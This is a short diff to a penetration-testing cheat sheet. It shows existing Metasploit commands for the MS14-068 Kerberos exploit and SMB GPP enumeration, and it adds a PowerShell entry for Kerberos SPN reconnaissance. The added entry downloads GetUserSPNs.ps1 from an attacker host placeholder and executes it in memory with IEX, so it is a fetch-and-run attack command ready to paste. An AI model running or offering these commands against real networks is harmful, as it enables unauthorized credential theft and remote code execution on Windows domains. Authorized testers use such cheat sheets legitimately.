@@ -31,3 +31,11 @@ msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
 ```
 msfconsole -x "use scanner/smb/smb_enum_gpp"
 ```
+
+## powershell - get user SPN
+#plateform/windows #target/remote #port/88 #protocol/kerberos #cat/RECON 
+
+https://github.com/nidem/kerberoast
+```powershell
+(new-object system.net.webclient).downloadstring('http://<lhost>/GetUserSPNs.ps1') | IEX
+```
